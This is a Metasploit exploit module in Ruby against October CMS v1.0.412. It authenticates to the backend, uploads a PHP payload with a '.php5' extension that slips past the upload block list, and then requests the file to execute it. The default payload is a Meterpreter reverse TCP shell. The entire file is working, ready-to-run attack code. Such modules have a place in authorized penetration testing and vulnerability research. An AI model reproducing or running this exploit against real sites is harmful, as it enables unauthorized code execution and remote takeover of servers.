##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'October CMS Upload Protection Bypass Code Execution',
      'Description' => %q{
          This module exploits an Authenticated user with permission to upload and manage media contents can
          upload various files on the server. Application prevents the user from
          uploading PHP code by checking the file extension. It uses black-list based
          approach, as seen in octobercms/vendor/october/rain/src/Filesystem/
          Definitions.php:blockedExtensions().
          This module was tested against October Machine on HachTheBox.
      },
      'Author' =>
        [
          'Anti RÃ¤is', #Discovery
          'Touhid M.Shaikh <touhidshaikh22[at]gmail.com>', # Metasploit Module
          'SecureLayer7.net' # Metasploit Module
        ],
      'License' => MSF_LICENSE,
      'References' =>
        [
          ['EDB','41936']
        ],
      'DefaultOptions' =>
        {
          'SSL'     => false,
          'PAYLOAD' => 'php/meterpreter/reverse_tcp',
          'ENCODER' => 'php/base64',
        },
      'Privileged' => false,
      'Platform'   => ['php'],
      'Arch'       => ARCH_PHP,
      'Targets' =>
        [
          [ 'October CMS v1.0.412', { } ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Apr 25 2017'))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "Base October CMS directory path", '/']),
        OptString.new('USERNAME', [ true, "Username to authenticate with", 'admin']),
        OptString.new('PASSWORD', [ true, "Password to authenticate with", 'admin'])
      ])
  end

  def uri
    return target_uri.path
  end

  def check
    begin
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(uri, '/modules/system/assets/js/framework.js')
      })
    rescue
      vprint_error('Unable to access the /assets/js/framework.js file')
      return CheckCode::Unknown
    end

    if res.code == 200
      return Exploit::CheckCode::Appears
    end

    return CheckCode::Safe
  end

  def login
    res = send_request_cgi({
      'uri' => normalize_uri(uri, '/backend/backend/auth/signin'),
      'method' => 'GET',
    })

    # Grabbing Session Key and token from body
    /name="_session_key" type="hidden" value="(?<session>[A-Za-z0-9"]+)">/ =~ res.body
    fail_with(Failure::UnexpectedReply, "#{peer} - Could not determine Session Key") if session.nil?

    /name="_token" type="hidden" value="(?<token>[A-Za-z0-9"]+)">/ =~ res.body
    fail_with(Failure::UnexpectedReply, "#{peer} - Could not determine token") if token.nil?
    vprint_good("Token for login : #{token}")
    vprint_good("Session Key for login : #{session}")

    cookies = res.get_cookies
    vprint_status('Trying to Login ......')

    # Send Creds with cookies.
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(uri, '/backend/backend/auth/signin'),
      'cookie' => cookies,
      'vars_post' => Hash[{
        '_session_key' => session,
        '_token' => token,
        'postback' => '1',
        'login' => datastore['USERNAME'],
        'password' => datastore['PASSWORD']
      }.to_a.shuffle],
    })

    fail_with(Failure::UnexpectedReply, "#{peer} - Did not respond to Login request") if res.nil?

    # if we redirect to core_welcome dan we assume we have authenticated cookie.
    if res.code == 302
      print_good("Authentication successful: #{datastore['USERNAME']}:#{datastore['PASSWORD']}")
      store_valid_credential(user: datastore['USERNAME'], private: datastore['PASSWORD'])
      return cookies
    else
      fail_with(Failure::UnexpectedReply, "#{peer} - Authentication Failed :[ #{datastore['USERNAME']}:#{datastore['PASSWORD']} ]")
    end
  end


  def exploit

    cookies = login

    #Payload
    evil = "<?php #{payload.encode} ?>"
    payload_name = "#{rand_text_alpha(8 + rand(5))}.php5"

    # setup POST request.
    post_data = Rex::MIME::Message.new
    post_data.add_part("/", content_type = nil, transfer_encoding = nil, content_disposition = 'form-data; name="path"')
    post_data.add_part(evil, content_type = 'application/x-php', transfer_encoding = nil, content_disposition = "form-data; name=\"file_data\"; filename=\"#{payload_name}")  #payload
    data = post_data.to_s

    vprint_status("Trying to upload malicious #{payload_name} file ....")
    # Lets Send Upload request.
    res = send_request_cgi({
      'uri' => normalize_uri(uri, '/backend/cms/media'),
      'agent' => 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
      'method' => 'POST',
      'cookie' => cookies,
      'headers' => {
        'X-OCTOBER-FILEUPLOAD' => 'MediaManager-manager'
      },
      'Connection' => 'close',
      'data' => data,
      'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
    })

    # Executing Payload Now
    res = send_request_cgi({
      'uri' => normalize_uri(uri, "/storage/app/media/#{payload_name}"),
      'method' => 'GET',
    })
  end
end
